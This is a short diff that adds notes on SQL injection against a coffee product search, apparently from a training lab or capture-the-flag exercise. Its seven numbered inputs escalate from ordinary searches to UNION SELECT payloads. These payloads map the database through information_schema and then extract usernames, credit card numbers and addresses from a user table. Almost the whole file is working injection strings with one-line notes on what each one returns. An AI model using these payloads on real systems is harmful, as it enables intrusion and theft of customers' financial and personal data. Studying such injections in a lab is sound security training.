@@ -1,0 +1,11 @@
+1. <empty> -> Displays everything
+2. coffee -> Displays coffee related 
+3. ';# -> Displays everything
+4. coffee%' UNION (SELECT 1,2,3,4 FROM dual);#
+	-> Proves we can SQL Inject
+5. coffee%' UNION (SELECT 1,TABLE_NAME,TABLE_SCHEMA,4 FROM information_schema.tables);#
+	-> Grabs info from information_tables
+6. coffee%' UNION (SELECT 1,COLUMN_NAME,3,4 FROM information_schema.columns WHERE TABLE_NAME = 'user');#
+	-> TO grab user info
+7. coffee%' UNION (SELECT 1,username,ccnum,address FROM user);#
+	-> Gets user specific info
